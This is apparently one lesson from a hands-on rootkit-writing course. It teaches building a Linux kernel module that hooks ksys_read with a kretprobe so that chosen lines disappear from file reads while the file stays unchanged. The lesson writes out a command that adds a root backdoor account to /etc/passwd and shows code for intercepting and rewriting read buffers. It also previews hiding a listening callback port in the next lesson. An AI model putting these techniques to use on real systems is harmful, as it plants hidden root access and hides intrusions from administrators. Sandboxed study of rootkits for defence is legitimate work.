# L12: Content Line Filter

## Mission

L11 removed directory entries before userspace could inspect them.
L12 applies the same return-path idea to text reads: remove every returned line
that contains a selected string while leaving the underlying file unchanged.

By the end of the exercise, these two commands are symmetric:

```sh
mkdir rklings.h.c.secret_token
mkdir rklings.u.c.secret_token
```

The first command hides matching lines from ordinary reads.
The second removes the exact target and restores those lines.

## What you will observe

After implementing the filter, use the control plane from L06 to elevate the
student shell and append a visible account record:

```sh
mkdir rklings.e
id
# uid=0(root) ...

printf 'backdoor:x:0:0::/root:/bin/bash\n' >> /etc/passwd
grep backdoor /etc/passwd
# backdoor:x:0:0::/root:/bin/bash
```

Your implementation must remove that line from returned output without rewriting
the file.

## Workspace

Open `exercises/L12-content-filter/main.c`.
The workspace already contains:

- the `mkdir` and `mkdirat` interception used by the control plane;
- command routing for `h.c` and `u.c`;
- the module and target-list types;
- a declared `ksys_read` kretprobe;
- TODO markers at every implementation point.

You only implement the target-list operations, read filtering, and probe
lifecycle.

## How the filter works

`read(fd, buf, count)` returns file bytes in a userspace buffer.
A kretprobe lets the module remember that buffer before `ksys_read` runs and
rewrite it after the kernel has filled it.

```text
cat /etc/passwd
        |
        v
ksys_read(fd, user_buffer, count)
        |
        | entry: remember user_buffer and count
        v
kernel copies file data into user_buffer
        |
        | return: copy returned bytes into a kernel buffer
        |         remove complete matching lines
        |         copy the shorter result back
        |         replace the read return value
        v
cat receives only the remaining bytes
```

## Implement it

Work through the TODOs in this order.

### 1. Complete the target list

Implement `rk_target_add` and `rk_target_remove` using the spinlock already in
`struct rk_target_list`.

- Reject additions after `RK_TARGET_MAX` with `-ENOSPC`.
- Copy targets with `strscpy`.
- Remove only an exact string match.
- Close the array gap with `memmove`.
- Return `-ENOENT` when the requested target is absent.

Then implement `line_matches`.
It must return true when any registered target occurs anywhere inside the
bounded line.
Use `strnstr`; the line is not guaranteed to end with `\0`.

### 2. Capture the read buffer

`ksys_read` is a regular kernel function, not a syscall wrapper.
Its arguments are directly in the probe registers:

```c
static int read_entry(struct kretprobe_instance *ri,
                      struct pt_regs *regs)
{
    struct read_data *data = ri->data;

    data->ubuf = (void __user *)regs->si;
    data->count = (size_t)regs->dx;
    return 0;
}
```

Do not use `regs_get_kernel_argument` here.
That extra indirection was required for the syscall wrapper in L11, but it would
treat unrelated data as registers in this hook.

### 3. Filter the returned bytes

In `read_return`, start with the actual return value:

```c
total = regs_return_value(regs);
```

Return without modifying anything when:

- `total <= 0`;
- no content targets are registered;
- allocation or `copy_from_user` fails.

Allocate `total` bytes, copy them from the saved userspace buffer, and walk the
returned data one line at a time:

```c
nl = memchr(pos, '\n', remaining);
line_len = nl ? nl - pos + 1 : remaining;
```

When `line_matches` is true, move the remaining bytes over that line with
`memmove` and reduce `new_total`.
Do not advance `pos` after removal because a new line now begins at the same
address.
Advance by `line_len` only when the line remains.

If the size changed, copy `new_total` bytes back and replace the function's
return value:

```c
regs_set_return_value(regs, new_total);
```

Always free the kernel buffer.
If `copy_to_user` fails, return `-EFAULT` instead of reporting bytes that were
not delivered.

### 4. Register and release the probes

Initialize the target-list lock, then register:

1. `read_probe`
2. `rk_mkdir_probe`
3. `rk_mkdirat_probe`

If registration fails, unregister only the probes that succeeded.
Module exit unregisters all three in reverse order.

## Scope of this lesson

This implementation filters complete lines present in one returned read buffer.
A line split across two separate reads may not be matched as one line.
It also demonstrates the broad risk of filtering a shared read path: careless
matching can alter data consumed by programs as well as data printed by tools.

Later integration exercises restrict the applicable file reads and verify that
terminal, pipe, socket, and executable streams remain intact.

## Test it

After implementing the TODOs, rebuild and restart the exercise:

```sh
./rklings run L12
```

Inside the guest:

```sh
mkdir rklings.e
printf 'backdoor:x:0:0::/root:/bin/bash\n' >> /etc/passwd

grep backdoor /etc/passwd
# backdoor:x:0:0::/root:/bin/bash

mkdir rklings.h.c.backdoor
grep backdoor /etc/passwd
# no output

mkdir rklings.u.c.backdoor
grep backdoor /etc/passwd
# backdoor:x:0:0::/root:/bin/bash
```

## Validate

From the repository root:

```sh
./rklings validate L12
```

Validation checks three behaviors:

```text
[+] matching lines are absent from returned output
[+] non-matching reads remain byte-for-byte unchanged
[+] removing the exact target restores matching lines
PASS
```

## Next

The account record can now disappear from ordinary inspection, but a listening
callback still appears in the host's network tables.
L13 hides a selected port while the service remains reachable.
